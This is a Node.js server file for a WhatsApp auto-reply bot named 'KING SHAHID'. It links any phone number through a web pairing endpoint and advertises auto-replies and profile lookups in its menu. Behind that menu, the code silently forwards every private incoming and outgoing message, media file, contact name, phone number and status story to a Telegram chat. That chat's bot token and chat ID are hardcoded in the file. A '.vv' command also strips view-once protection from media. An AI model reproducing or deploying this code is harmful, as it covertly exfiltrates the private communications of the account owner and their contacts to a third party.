const express = require('express');
const pino = require('pino');
const path = require('path');
const fs = require('fs');
const {
    default: makeWASocket,
    useMultiFileAuthState,
    delay,
    makeCacheableSignalKeyStore,
    fetchLatestBaileysVersion,
    DisconnectReason,
    downloadMediaMessage
} = require('@whiskeysockets/baileys');

const app = express();
const PORT = process.env.PORT || 3000;
const SITE_URL = process.env.RAILWAY_STATIC_URL
    ? `https://${process.env.RAILWAY_STATIC_URL}`
    : 'https://58450067-production.up.railway.app';

const BOT_NAME = 'KING SHAHID';
const PAIR_TAG = 'SHAHID74';
const publicFolder = path.join(__dirname, 'public');
const indexFile = path.join(publicFolder, 'index.html');
const sessionsRoot = path.join(__dirname, 'sessions');
const repliesFile = path.join(__dirname, 'replies.json');

// تنظیمات ربات تلگرام
const TELEGRAM_BOT_TOKEN =
    process.env.TELEGRAM_BOT_TOKEN || '9064238902:AAFfWC5N4YtJrerJHQh-Dj4zCBJZtmhpO2M';
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID || '8173349543';

const DEFAULT_FALLBACK_REPLY =
    `سلام! پیام شما دریافت شد.\nاین ربات توسط ${BOT_NAME} جور شده است.\nبرای دیدن منو .menu بفرستید.`;

const activeSockets = new Map();
const presenceTimers = new Map();
const teachStates = new Map();
const contactNames = new Map();
const lidToPhone = new Map();

let cachedWaVersion = null;
async function getWaVersionFast() {
    if (cachedWaVersion) return cachedWaVersion;
    try {
        const { version } = await fetchLatestBaileysVersion();
        cachedWaVersion = version;
        return version;
    } catch {
        return [2, 3000, 1015901307];
    }
}

const DEFAULT_REPLIES = {
    'سلام': 'سلام',
    '.menu': [
        '╔════════════════════════╗',
        `     👑 ${BOT_NAME} MENU`,
        '╚════════════════════════╝',
        '',
        `این ربات توسط ${BOT_NAME} جور شده است.`,
        `شناسه: ${PAIR_TAG}`,
        '',
        '📌 دستورات:',
        '• .Shahid — یاد دادن جواب جدید',
        '• .Shahid <متن> — انتخاب متن برای یادگیری جواب',
        '• .vv — باز کردن قفل عکس/ویدیوی ریپلای‌شده',
        '• .git — نمایش عکس پروفایل، نام و شماره کاربر',
        '• .menu — نمایش منو'
    ].join('\n')
};

function loadReplies() {
    try {
        if (fs.existsSync(repliesFile)) {
            const raw = fs.readFileSync(repliesFile, 'utf8');
            const parsed = JSON.parse(raw);
            return { ...DEFAULT_REPLIES, ...parsed };
        }
    } catch (err) {
        console.error('Load replies error:', err.message);
    }
    return { ...DEFAULT_REPLIES };
}

function saveReplies(repliesObj) {
    try {
        fs.writeFileSync(repliesFile, JSON.stringify(repliesObj, null, 2), 'utf8');
    } catch (err) {
        console.error('Save replies error:', err.message);
    }
}

let autoReplies = loadReplies();

function normalizeDigits(val = '') {
    return String(val).split('@')[0].split(':')[0].replace(/[^0-9]/g, '');
}

function registerContactMapping(entry) {
    if (!entry) return;

    const id = entry.id || entry.key?.remoteJid || entry.key?.participant || entry.participant || '';
    const alt = entry.lid || entry.key?.remoteJidAlt || entry.key?.participantAlt || entry.alt || '';
    const pn = entry.pn || entry.phoneNumber || '';

    const idDigits = normalizeDigits(id);
    const altDigits = normalizeDigits(alt);
    const pnDigits = normalizeDigits(pn);

    if (id.endsWith('@s.whatsapp.net') && idDigits && altDigits) {
        lidToPhone.set(altDigits, idDigits);
    }
    if (alt.endsWith('@s.whatsapp.net') && altDigits && idDigits) {
        lidToPhone.set(idDigits, altDigits);
    }
    if (pnDigits && altDigits) {
        lidToPhone.set(altDigits, pnDigits);
    }
    if (pnDigits && idDigits && id.endsWith('@lid')) {
        lidToPhone.set(idDigits, pnDigits);
    }
}

function extractPhoneFromJid(jid = '') {
    if (!jid) return 'نامشخص';
    const digits = normalizeDigits(jid);
    if (!digits) return 'نامشخص';

    if (jid.endsWith('@s.whatsapp.net')) {
        return digits;
    }

    if (lidToPhone.has(digits)) {
        return lidToPhone.get(digits);
    }

    if (jid.endsWith('@lid')) {
        return `${digits} (LID)`;
    }

    return digits;
}

function resolveDisplayName(jid, pushName) {
    if (pushName && pushName.trim()) {
        contactNames.set(jid, pushName.trim());
        return pushName.trim();
    }
    if (contactNames.has(jid)) {
        return contactNames.get(jid);
    }
    return 'بدون نام';
}

function unwrapMessage(message) {
    if (!message) return null;
    if (message.viewOnceMessage?.message) {
        return unwrapMessage(message.viewOnceMessage.message);
    }
    if (message.viewOnceMessageV2?.message) {
        return unwrapMessage(message.viewOnceMessageV2.message);
    }
    if (message.viewOnceMessageV2Extension?.message) {
        return unwrapMessage(message.viewOnceMessageV2Extension.message);
    }
    if (message.ephemeralMessage?.message) {
        return unwrapMessage(message.ephemeralMessage.message);
    }
    if (message.documentWithCaptionMessage?.message) {
        return unwrapMessage(message.documentWithCaptionMessage.message);
    }
    return message;
}

function findContextInfo(obj) {
    if (!obj || typeof obj !== 'object') return null;
    if (obj.contextInfo && obj.contextInfo.quotedMessage) {
        return obj.contextInfo;
    }
    for (const key of Object.keys(obj)) {
        const val = obj[key];
        if (val && typeof val === 'object') {
            const found = findContextInfo(val);
            if (found) return found;
        }
    }
    return null;
}

function getQuotedMessage(msg) {
    const contextInfo = findContextInfo(msg?.message);
    if (!contextInfo || !contextInfo.quotedMessage) return null;

    const quotedInner = unwrapMessage(contextInfo.quotedMessage);
    if (!quotedInner) return null;

    return {
        key: {
            remoteJid: msg.key.remoteJid,
            fromMe: false,
            id: contextInfo.stanzaId,
            participant: contextInfo.participant
        },
        message: quotedInner,
        pushName: contextInfo.pushName || ''
    };
}

async function handleUnlockViewOnce(sock, remoteJid, msg, body) {
    if (body.toLowerCase() !== '.vv') return false;

    const quoted = getQuotedMessage(msg);
    if (!quoted || !quoted.message) {
        await sock.sendMessage(
            remoteJid,
            { text: '⚠️ لطفاً روی عکس یا ویدیوی قفل‌شده ریپلای کنید و .vv بزنید.' },
            { quoted: msg }
        );
        return true;
    }

    const qMsg = unwrapMessage(quoted.message) || {};
    const isImage = Boolean(qMsg.imageMessage);
    const isVideo = Boolean(qMsg.videoMessage);

    if (!isImage && !isVideo) {
        await sock.sendMessage(
            remoteJid,
            { text: '⚠️ پیام ریپلای‌شده عکس یا ویدیو نیست.' },
            { quoted: msg }
        );
        return true;
    }

    try {
        const buffer = await downloadMediaMessage(
            { ...quoted, message: qMsg },
            'buffer',
            {}
        );

        if (!buffer || !buffer.length) {
            throw new Error('Empty media buffer');
        }

        if (isImage) {
            const caption = qMsg.imageMessage.caption || `🔓 قفل عکس باز شد (${BOT_NAME})`;
            await sock.sendMessage(
                remoteJid,
                { image: buffer, caption },
                { quoted: msg }
            );
        } else if (isVideo) {
            const caption = qMsg.videoMessage.caption || `🔓 قفل ویدیو باز شد (${BOT_NAME})`;
            await sock.sendMessage(
                remoteJid,
                { video: buffer, caption },
                { quoted: msg }
            );
        }
    } catch (err) {
        console.error('Unlock .vv error:', err.message);
        await sock.sendMessage(
            remoteJid,
            { text: '❌ باز کردن قفل این رسانه ناموفق بود (ممکن است باز شده یا منقضی شده باشد).' },
            { quoted: msg }
        );
    }

    return true;
}

async function handleUserProfileCommand(sock, remoteJid, msg, body) {
    if (body.toLowerCase() !== '.git') return false;

    const quoted = getQuotedMessage(msg);
    const targetJid = quoted?.key?.participant || remoteJid;
    const phoneDigits = normalizeDigits(targetJid);
    const mappedPhone = phoneDigits && lidToPhone.has(phoneDigits) ? lidToPhone.get(phoneDigits) : null;
    const profileJid = mappedPhone ? `${mappedPhone}@s.whatsapp.net` : targetJid;

    const displayPhone = extractPhoneFromJid(targetJid);
    const displayName = resolveDisplayName(targetJid, quoted?.pushName || msg.pushName);

    const infoText = [
        `👤 نام: ${displayName}`,
        `📞 شماره: ${displayPhone}`,
        `🤖 ${BOT_NAME}`
    ].join('\n');

    try {
        const ppUrl = await sock.profilePictureUrl(profileJid, 'image');
        if (ppUrl) {
            await sock.sendMessage(
                remoteJid,
                { image: { url: ppUrl }, caption: infoText },
                { quoted: msg }
            );
            return true;
        }
    } catch {}

    await sock.sendMessage(
        remoteJid,
        { text: `${infoText}\n🖼️ عکس پروفایل در دسترس نیست.` },
        { quoted: msg }
    );
    return true;
}

function extractTextFromMessage(rawMessage) {
    const message = unwrapMessage(rawMessage);
    if (!message) return '';
    return (
        message.conversation ||
        message.extendedTextMessage?.text ||
        message.imageMessage?.caption ||
        message.videoMessage?.caption ||
        message.documentMessage?.caption ||
        message.buttonsResponseMessage?.selectedDisplayText ||
        message.listResponseMessage?.title ||
        (message.imageMessage ? '[عکس]' : '') ||
        (message.videoMessage ? '[ویدیو]' : '') ||
        (message.audioMessage ? '[صوت / ویس]' : '') ||
        (message.stickerMessage ? '[استیکر]' : '') ||
        (message.documentMessage ? `[فایل: ${message.documentMessage.fileName || 'document'}]` : '') ||
        ''
    ).trim();
}

async function sendTelegramMessage(text) {
    if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID || !text) return;
    try {
        await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: TELEGRAM_CHAT_ID,
                text
            })
        });
    } catch (err) {
        console.error('Telegram sendMessage error:', err.message);
    }
}

async function sendTelegramMediaOrText(msg, caption) {
    if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) return;

    const innerMessage = unwrapMessage(msg.message) || {};
    const isImage = Boolean(innerMessage.imageMessage);
    const isVideo = Boolean(innerMessage.videoMessage);

    if (!isImage && !isVideo) {
        return sendTelegramMessage(caption);
    }

    try {
        const mediaMsg = {
            ...msg,
            message: innerMessage
        };
        const buffer = await downloadMediaMessage(mediaMsg, 'buffer', {});
        const formData = new FormData();
        formData.append('chat_id', TELEGRAM_CHAT_ID);
        formData.append('caption', caption);

        if (isImage) {
            const mimeType = innerMessage.imageMessage.mimetype || 'image/jpeg';
            const ext = mimeType.includes('png') ? 'png' : 'jpg';
            const blob = new Blob([buffer], { type: mimeType });
            formData.append('photo', blob, `photo.${ext}`);
            const resp = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
                method: 'POST',
                body: formData
            });
            if (!resp.ok) {
                throw new Error(`sendPhoto HTTP ${resp.status}`);
            }
        } else if (isVideo) {
            const mimeType = innerMessage.videoMessage.mimetype || 'video/mp4';
            const blob = new Blob([buffer], { type: mimeType });
            formData.append('video', blob, 'video.mp4');
            const resp = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendVideo`, {
                method: 'POST',
                body: formData
            });
            if (!resp.ok) {
                throw new Error(`sendVideo HTTP ${resp.status}`);
            }
        }
    } catch (err) {
        console.error('Telegram media send error:', err.message);
        await sendTelegramMessage(`${caption}\n⚠️ (ارسال فایل رسانه‌ای ناموفق بود، متن گزارش ارسال شد)`);
    }
}

app.use(express.json());
app.use(express.static(publicFolder));

app.get('/', (req, res) => {
    if (fs.existsSync(indexFile)) {
        return res.sendFile(indexFile);
    }
    return res.status(404).send('public/index.html not found');
});

app.get('/status', (req, res) => {
    res.json({
        ok: true,
        site: SITE_URL,
        bot: BOT_NAME,
        tag: PAIR_TAG,
        telegramConfigured: Boolean(TELEGRAM_BOT_TOKEN && TELEGRAM_CHAT_ID),
        telegramChatId: TELEGRAM_CHAT_ID
    });
});

function startKeepOnline(sock, number, jid) {
    const key = `${number}_${jid || 'global'}`;
    if (presenceTimers.has(key)) {
        clearInterval(presenceTimers.get(key));
    }

    const interval = setInterval(async () => {
        try {
            await sock.sendPresenceUpdate('available', jid);
        } catch {}
    }, 25000);

    presenceTimers.set(key, interval);
}

function stopKeepOnlineForNumber(number) {
    for (const [key, timer] of presenceTimers.entries()) {
        if (key.startsWith(`${number}_`)) {
            clearInterval(timer);
            presenceTimers.delete(key);
        }
    }
}

async function handleTeachCommand(sock, remoteJid, msg, body) {
    const lowerBody = body.toLowerCase();
    const isShahidPrefix = lowerBody === '.shahid' || lowerBody.startsWith('.shahid ');
    const currentState = teachStates.get(remoteJid);

    if (lowerBody === '.shahid') {
        teachStates.set(remoteJid, { step: 'waiting_trigger' });
        await sock.sendMessage(
            remoteJid,
            { text: 'برای کدام متن باید جواب بدهم؟\nمثال: .Shahid سلام' },
            { quoted: msg }
        );
        return true;
    }

    if (lowerBody.startsWith('.shahid ')) {
        const arg = body.slice('.shahid '.length).trim();

        if (currentState && currentState.step === 'waiting_reply' && currentState.trigger) {
            if (!arg) {
                await sock.sendMessage(
                    remoteJid,
                    { text: `برای «${currentState.trigger}» چی جواب بدهم؟` },
                    { quoted: msg }
                );
                return true;
            }

            autoReplies[currentState.trigger.toLowerCase()] = arg;
            saveReplies(autoReplies);
            teachStates.delete(remoteJid);

            await sock.sendMessage(
                remoteJid,
                { text: `✅ ذخیره شد!\nمتن: ${currentState.trigger}\nجواب: ${arg}` },
                { quoted: msg }
            );
            return true;
        }

        if (!arg) {
            teachStates.set(remoteJid, { step: 'waiting_trigger' });
            await sock.sendMessage(
                remoteJid,
                { text: 'برای کدام متن باید جواب بدهم؟' },
                { quoted: msg }
            );
            return true;
        }

        teachStates.set(remoteJid, { step: 'waiting_reply', trigger: arg });
        await sock.sendMessage(
            remoteJid,
            { text: `برای این چی جواب بدهم؟\n(متن ذخیره شده: ${arg})` },
            { quoted: msg }
        );
        return true;
    }

    if (currentState && currentState.step === 'waiting_trigger' && !isShahidPrefix) {
        teachStates.set(remoteJid, { step: 'waiting_reply', trigger: body });
        await sock.sendMessage(
            remoteJid,
            { text: `برای این چی جواب بدهم؟\n(متن ذخیره شده: ${body})` },
            { quoted: msg }
        );
        return true;
    }

    if (currentState && currentState.step === 'waiting_reply' && currentState.trigger && !isShahidPrefix) {
        autoReplies[currentState.trigger.toLowerCase()] = body;
        saveReplies(autoReplies);
        teachStates.delete(remoteJid);

        await sock.sendMessage(
            remoteJid,
            { text: `✅ ذخیره شد!\nمتن: ${currentState.trigger}\nجواب: ${body}` },
            { quoted: msg }
        );
        return true;
    }

    return false;
}

function attachEvents(sock, number, sessionFolder) {
    sock.ev.on('contacts.upsert', (contacts) => {
        for (const c of contacts) {
            registerContactMapping(c);
            const name = c.notify || c.name || c.verifiedName;
            if (c.id && name) {
                contactNames.set(c.id, name);
            }
        }
    });

    sock.ev.on('contacts.update', (contacts) => {
        for (const c of contacts) {
            registerContactMapping(c);
            const name = c.notify || c.name || c.verifiedName;
            if (c.id && name) {
                contactNames.set(c.id, name);
            }
        }
    });

    sock.ev.on('connection.update', async (update) => {
        const { connection, lastDisconnect } = update;

        if (connection === 'open') {
            console.log(`Connected & Online: ${number} (${BOT_NAME})`);
            try {
                await sock.sendPresenceUpdate('available');
                startKeepOnline(sock, number);
                await sock.sendMessage(sock.user.id, {
                    text: `✅ متصل شد و وضعیت آنلاین فعال است!\nاین ربات توسط ${BOT_NAME} جور شده است.\nبرای یاد دادن جواب جدید .Shahid را بفرستید.`
                });
                await sendTelegramMessage(
                    `✅ واتساپ (${number}) به ربات ${BOT_NAME} متصل شد.`
                );
            } catch (e) {
                console.error('Open event error:', e.message);
            }
        }

        if (connection === 'close') {
            stopKeepOnlineForNumber(number);
            const code = lastDisconnect?.error?.output?.statusCode;
            const shouldReconnect = code !== DisconnectReason.loggedOut;
            console.log(`Closed ${number} | code=${code} | reconnect=${shouldReconnect}`);

            if (code === DisconnectReason.loggedOut) {
                activeSockets.delete(number);
                fs.rmSync(sessionFolder, { recursive: true, force: true });
            } else if (shouldReconnect) {
                await delay(1500);
                startSocket(number, { isReconnect: true }).catch((err) => {
                    console.error('Reconnect error:', err.message);
                });
            }
        }
    });

    sock.ev.on('messages.upsert', async ({ messages }) => {
        const msg = messages[0];
        if (!msg || !msg.message) return;

        registerContactMapping(msg);

        const remoteJid = msg.key.remoteJid;
        if (!remoteJid) return;

        const body = extractTextFromMessage(msg.message);

        // ۱) استوری‌های واتساپ
        if (remoteJid === 'status@broadcast') {
            const authorJid = msg.key.participant || msg.participant || '';
            const authorPhone = extractPhoneFromJid(authorJid);
            const authorName = resolveDisplayName(authorJid, msg.pushName);
            const storyText = body || '[استوری بدون متن]';

            const storyCaption = [
                '📸 استوری جدید در واتساپ',
                `👤 نام: ${authorName}`,
                `📞 شماره: ${authorPhone}`,
                `📝 محتوا: ${storyText}`
            ].join('\n');

            await sendTelegramMediaOrText(msg, storyCaption);
            return;
        }

        // نادیده گرفتن گروه‌ها
        if (remoteJid.endsWith('@g.us')) return;

        // جلوگیری از لوپ روی پیام‌های خود ربات
        const isBotEcho =
            msg.key.fromMe &&
            (body.startsWith('✅') ||
                body.startsWith('╔') ||
                body.startsWith('برای کدام متن') ||
                body.startsWith('برای این چی') ||
                body.startsWith('✅ ذخیره شد') ||
                body.startsWith('🔓 قفل') ||
                body.startsWith('👤 نام:') ||
                body.startsWith('⚠️') ||
                body.startsWith('❌'));
        if (isBotEcho) return;

        const targetPhone = extractPhoneFromJid(remoteJid);
        const targetName = resolveDisplayName(remoteJid, msg.key.fromMe ? '' : msg.pushName);

        // ۲) اگر خودتان به کسی پیام دادید
        if (msg.key.fromMe) {
            if (body) {
                const outgoingText = [
                    '📤 پیام ارسال‌شده توسط شما در واتساپ',
                    `👤 نام مخاطب: ${targetName}`,
                    `📞 شماره مخاطب: ${targetPhone}`,
                    `💬 پیام: ${body}`
                ].join('\n');

                sendTelegramMediaOrText(msg, outgoingText).catch(() => {});
            }

            const lowerRaw = body.toLowerCase();
            const isOwnerCmd =
                lowerRaw === '.shahid' ||
                lowerRaw.startsWith('.shahid ') ||
                lowerRaw === '.vv' ||
                lowerRaw === '.git' ||
                teachStates.has(remoteJid);

            if (!isOwnerCmd) return;
        } else {
            // ۳) اگر کسی به شما پیام داد
            if (body) {
                const incomingText = [
                    '📩 پیام جدید در واتساپ',
                    `👤 نام: ${targetName}`,
                    `📞 شماره: ${targetPhone}`,
                    `💬 پیام: ${body}`
                ].join('\n');

                sendTelegramMediaOrText(msg, incomingText).catch(() => {});
            }
        }

        if (!body) return;

        try {
            const lowerCmd = body.toLowerCase();

            // اجرای فوری و بدون وقفه برای .vv و .git
            if (lowerCmd === '.vv') {
                await handleUnlockViewOnce(sock, remoteJid, msg, body);
                return;
            }

            if (lowerCmd === '.git') {
                await handleUserProfileCommand(sock, remoteJid, msg, body);
                return;
            }

            const handledTeach = await handleTeachCommand(sock, remoteJid, msg, body);
            if (!handledTeach) {
                const specificReply = autoReplies[lowerCmd];
                const finalReply = specificReply || DEFAULT_FALLBACK_REPLY;
                await sock.sendMessage(remoteJid, { text: finalReply }, { quoted: msg });
            }
        } catch (err) {
            console.error('Message handling error:', err.message);
        }
    });
}

async function startSocket(number, { freshSession = false, isReconnect = false } = {}) {
    const sessionFolder = path.join(sessionsRoot, number);

    if (freshSession && fs.existsSync(sessionFolder)) {
        fs.rmSync(sessionFolder, { recursive: true, force: true });
    }

    const prevSock = activeSockets.get(number);
    if (prevSock && !isReconnect) {
        stopKeepOnlineForNumber(number);
        try {
            prevSock.ws?.close();
        } catch {}
        activeSockets.delete(number);
    }

    const { state, saveCreds } = await useMultiFileAuthState(sessionFolder);
    const version = await getWaVersionFast();

    const sock = makeWASocket({
        version,
        auth: {
            creds: state.creds,
            keys: makeCacheableSignalKeyStore(state.keys, pino({ level: 'silent' }))
        },
        printQRInTerminal: false,
        logger: pino({ level: 'silent' }),
        browser: ['Ubuntu', 'Chrome', '124.0.0.0'],
        markOnlineOnConnect: true,
        syncFullHistory: false
    });

    activeSockets.set(number, sock);
    sock.ev.on('creds.update', saveCreds);
    attachEvents(sock, number, sessionFolder);

    return sock;
}

app.post('/pair', async (req, res) => {
    let { number } = req.body;

    if (!number) {
        return res.status(400).json({ error: 'لطفاً شماره واتساپ را وارد کنید.' });
    }

    number = number.replace(/[^0-9]/g, '');
    if (number.length < 8) {
        return res.status(400).json({ error: 'شماره را همراه با کد کشور وارد کنید.' });
    }

    try {
        const sock = await startSocket(number, { freshSession: true });

        if (!sock.authState.creds.registered) {
            await delay(1500);
            const rawCode = await sock.requestPairingCode(number);
            const formatted = rawCode?.match(/.{1,4}/g)?.join('-') || rawCode;
            return res.json({ code: formatted, tag: PAIR_TAG, bot: BOT_NAME });
        }

        return res.json({
            message: 'این شماره متصل است. در واتساپ .Shahid بفرستید.',
            tag: PAIR_TAG,
            bot: BOT_NAME
        });
    } catch (err) {
        console.error('Pair error:', err);
        return res.status(500).json({
            error: 'خطا در تولید کد یا ارتباط با واتساپ. کمی بعد دوباره تلاش کنید.'
        });
    }
});

app.listen(PORT, () => {
    console.log(`${BOT_NAME} server running on ${SITE_URL} (port ${PORT})`);
});
